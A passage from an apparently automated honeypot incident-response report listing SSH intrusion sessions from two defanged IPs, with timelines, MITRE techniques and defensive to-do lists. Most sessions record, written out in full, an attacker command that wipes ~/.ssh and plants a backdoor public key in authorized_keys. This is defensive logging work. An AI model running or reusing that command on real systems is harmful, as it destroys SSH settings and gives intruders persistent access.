| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:02:46` | `cowrie.session.connect` |
| `2026-04-14 21:02:46` | `cowrie.client.version` |
| `2026-04-14 21:02:46` | `cowrie.client.kex` |
| `2026-04-14 21:02:47` | `cowrie.login.success` |
| `2026-04-14 21:02:48` | `cowrie.session.params` |
| `2026-04-14 21:02:48` | `cowrie.command.input` |
| `2026-04-14 21:02:48` | `cowrie.command.failed` |
| `2026-04-14 21:02:48` | `cowrie.log.closed` |
| `2026-04-14 21:02:49` | `cowrie.session.params` |
| `2026-04-14 21:02:49` | `cowrie.command.input` |
| `2026-04-14 21:02:49` | `cowrie.session.file_download` |
| `2026-04-14 21:02:49` | `cowrie.log.closed` |
| `2026-04-14 21:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942634f355d9

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:02 |
| **Last Seen** | 2026-04-14 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:02:52` | `cowrie.session.connect` |
| `2026-04-14 21:02:52` | `cowrie.client.version` |
| `2026-04-14 21:02:53` | `cowrie.client.kex` |
| `2026-04-14 21:02:54` | `cowrie.login.success` |
| `2026-04-14 21:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a23137959f

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:03 |
| **Last Seen** | 2026-04-14 21:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:03:26` | `cowrie.session.connect` |
| `2026-04-14 21:03:26` | `cowrie.client.version` |
| `2026-04-14 21:03:26` | `cowrie.client.kex` |
| `2026-04-14 21:03:27` | `cowrie.login.success` |
| `2026-04-14 21:03:28` | `cowrie.session.params` |
| `2026-04-14 21:03:28` | `cowrie.command.input` |
| `2026-04-14 21:03:28` | `cowrie.command.failed` |
| `2026-04-14 21:03:28` | `cowrie.log.closed` |
| `2026-04-14 21:03:28` | `cowrie.session.params` |
| `2026-04-14 21:03:28` | `cowrie.command.input` |
| `2026-04-14 21:03:29` | `cowrie.session.file_download` |
| `2026-04-14 21:03:29` | `cowrie.log.closed` |
| `2026-04-14 21:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae826230de3c

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:03 |
| **Last Seen** | 2026-04-14 21:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:03:32` | `cowrie.session.connect` |
| `2026-04-14 21:03:32` | `cowrie.client.version` |
| `2026-04-14 21:03:32` | `cowrie.client.kex` |
| `2026-04-14 21:03:33` | `cowrie.login.success` |
| `2026-04-14 21:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf3571206839

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-04-14 21:03 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:03:50` | `cowrie.session.connect` |
| `2026-04-14 21:03:50` | `cowrie.client.version` |
| `2026-04-14 21:03:50` | `cowrie.client.kex` |
| `2026-04-14 21:03:51` | `cowrie.login.success` |
| `2026-04-14 21:03:57` | `cowrie.session.params` |
| `2026-04-14 21:03:57` | `cowrie.command.input` |
| `2026-04-14 21:03:57` | `cowrie.command.failed` |
| `2026-04-14 21:03:57` | `cowrie.log.closed` |
| `2026-04-14 21:03:57` | `cowrie.session.params` |
| `2026-04-14 21:03:57` | `cowrie.command.input` |
| `2026-04-14 21:03:58` | `cowrie.session.file_download` |
| `2026-04-14 21:03:58` | `cowrie.log.closed` |
| `2026-04-14 21:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354532ce4499

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:03 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:03:52` | `cowrie.session.connect` |
| `2026-04-14 21:03:52` | `cowrie.client.version` |
| `2026-04-14 21:03:53` | `cowrie.client.kex` |
| `2026-04-14 21:03:54` | `cowrie.login.success` |
| `2026-04-14 21:03:54` | `cowrie.session.params` |
| `2026-04-14 21:03:54` | `cowrie.command.input` |
| `2026-04-14 21:03:54` | `cowrie.command.failed` |
| `2026-04-14 21:03:54` | `cowrie.log.closed` |
| `2026-04-14 21:03:55` | `cowrie.session.params` |
| `2026-04-14 21:03:55` | `cowrie.command.input` |
| `2026-04-14 21:03:55` | `cowrie.session.file_download` |
| `2026-04-14 21:03:55` | `cowrie.log.closed` |
| `2026-04-14 21:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5835589f7b3

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:03 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:03:59` | `cowrie.session.connect` |
| `2026-04-14 21:03:59` | `cowrie.client.version` |
| `2026-04-14 21:03:59` | `cowrie.client.kex` |
| `2026-04-14 21:04:00` | `cowrie.login.success` |
| `2026-04-14 21:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d553a4de791

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-04-14 21:04 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:04:03` | `cowrie.session.connect` |
| `2026-04-14 21:04:03` | `cowrie.client.version` |
| `2026-04-14 21:04:03` | `cowrie.client.kex` |
| `2026-04-14 21:04:03` | `cowrie.login.success` |
| `2026-04-14 21:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d01de4f79c

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:04 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:04:06` | `cowrie.session.connect` |
| `2026-04-14 21:04:06` | `cowrie.client.version` |
| `2026-04-14 21:04:06` | `cowrie.client.kex` |
| `2026-04-14 21:04:07` | `cowrie.login.success` |
| `2026-04-14 21:04:08` | `cowrie.session.params` |
| `2026-04-14 21:04:08` | `cowrie.command.input` |
| `2026-04-14 21:04:08` | `cowrie.command.failed` |
| `2026-04-14 21:04:08` | `cowrie.log.closed` |
| `2026-04-14 21:04:09` | `cowrie.session.params` |
| `2026-04-14 21:04:09` | `cowrie.command.input` |
| `2026-04-14 21:04:09` | `cowrie.session.file_download` |
| `2026-04-14 21:04:09` | `cowrie.log.closed` |
| `2026-04-14 21:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34514fd47d61

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:04 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:04:12` | `cowrie.session.connect` |
| `2026-04-14 21:04:12` | `cowrie.client.version` |
| `2026-04-14 21:04:12` | `cowrie.client.kex` |
| `2026-04-14 21:04:13` | `cowrie.login.success` |
| `2026-04-14 21:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34a7dacaa7cf

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:04 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:04:33` | `cowrie.session.connect` |
| `2026-04-14 21:04:33` | `cowrie.client.version` |
| `2026-04-14 21:04:33` | `cowrie.client.kex` |
| `2026-04-14 21:04:34` | `cowrie.login.success` |
| `2026-04-14 21:04:35` | `cowrie.session.params` |
| `2026-04-14 21:04:35` | `cowrie.command.input` |
| `2026-04-14 21:04:35` | `cowrie.command.failed` |
| `2026-04-14 21:04:35` | `cowrie.log.closed` |
| `2026-04-14 21:04:35` | `cowrie.session.params` |
| `2026-04-14 21:04:35` | `cowrie.command.input` |
| `2026-04-14 21:04:36` | `cowrie.session.file_download` |
| `2026-04-14 21:04:36` | `cowrie.log.closed` |
| `2026-04-14 21:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903c712f2a61

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:04 |
| **Last Seen** | 2026-04-14 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:04:39` | `cowrie.session.connect` |
| `2026-04-14 21:04:39` | `cowrie.client.version` |
| `2026-04-14 21:04:39` | `cowrie.client.kex` |
| `2026-04-14 21:04:40` | `cowrie.login.success` |
| `2026-04-14 21:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b03359ccd2b

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:04 |
| **Last Seen** | 2026-04-14 21:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:04:59` | `cowrie.session.connect` |
| `2026-04-14 21:04:59` | `cowrie.client.version` |
| `2026-04-14 21:05:00` | `cowrie.client.kex` |
| `2026-04-14 21:05:01` | `cowrie.login.success` |
| `2026-04-14 21:05:01` | `cowrie.session.params` |
| `2026-04-14 21:05:01` | `cowrie.command.input` |
| `2026-04-14 21:05:01` | `cowrie.command.failed` |
| `2026-04-14 21:05:02` | `cowrie.log.closed` |
| `2026-04-14 21:05:02` | `cowrie.session.params` |
| `2026-04-14 21:05:02` | `cowrie.command.input` |
| `2026-04-14 21:05:03` | `cowrie.session.file_download` |
| `2026-04-14 21:05:03` | `cowrie.log.closed` |
| `2026-04-14 21:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8ace7cb1a8

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:05 |
| **Last Seen** | 2026-04-14 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:05:06` | `cowrie.session.connect` |
| `2026-04-14 21:05:06` | `cowrie.client.version` |
| `2026-04-14 21:05:06` | `cowrie.client.kex` |
| `2026-04-14 21:05:07` | `cowrie.login.success` |
| `2026-04-14 21:05:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689e91e7603f

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:05 |
| **Last Seen** | 2026-04-14 21:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:05:13` | `cowrie.session.connect` |
| `2026-04-14 21:05:13` | `cowrie.client.version` |
| `2026-04-14 21:05:13` | `cowrie.client.kex` |
| `2026-04-14 21:05:14` | `cowrie.login.success` |
| `2026-04-14 21:05:15` | `cowrie.session.params` |
| `2026-04-14 21:05:15` | `cowrie.command.input` |
| `2026-04-14 21:05:15` | `cowrie.command.failed` |
| `2026-04-14 21:05:15` | `cowrie.log.closed` |
| `2026-04-14 21:05:16` | `cowrie.session.params` |
| `2026-04-14 21:05:16` | `cowrie.command.input` |
| `2026-04-14 21:05:16` | `cowrie.session.file_download` |
| `2026-04-14 21:05:16` | `cowrie.log.closed` |
| `2026-04-14 21:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f60b6a608259

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:05 |
| **Last Seen** | 2026-04-14 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:05:19` | `cowrie.session.connect` |
| `2026-04-14 21:05:19` | `cowrie.client.version` |
| `2026-04-14 21:05:20` | `cowrie.client.kex` |
| `2026-04-14 21:05:21` | `cowrie.login.success` |
| `2026-04-14 21:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395a0e48b420

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-04-14 21:06 |
| **Last Seen** | 2026-04-14 21:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 21:06:18` | `cowrie.session.connect` |
| `2026-04-14 21:06:18` | `cowrie.client.version` |
| `2026-04-14 21:06:18` | `cowrie.client.kex` |
| `2026-04-14 21:06:19` | `cowrie.login.success` |
| `2026-04-14 21:06:20` | `cowrie.session.params` |
| `2026-04-14 21:06:20` | `cowrie.command.input` |
